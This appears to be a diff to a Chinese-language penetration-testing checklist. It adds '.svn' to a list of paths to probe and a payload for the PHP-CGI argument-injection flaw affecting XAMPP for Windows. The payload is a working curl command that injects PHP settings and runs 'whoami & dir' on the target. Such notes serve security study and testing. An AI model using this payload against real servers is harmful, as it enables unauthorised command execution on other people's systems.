@@ -95,6 +95,7 @@
   - cgi-bin
   - upload.php（進去看有沒有可以try的點）
   - login.php（進去看有沒有可以try的點）
+  - .svn
   - etc..
   - 感覺奇怪的都去看
 
@@ -129,5 +130,9 @@
     - PHP 8.1 < 8.1.29
   - 常見之 Apache HTTP Server 加上 PHP 組合
   - 所有版本的 XAMPP for Windows 安裝也預設受此弱點影響
+  - **Payload**
+    ```sh
+    curl.exe -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
+    ```
 
 
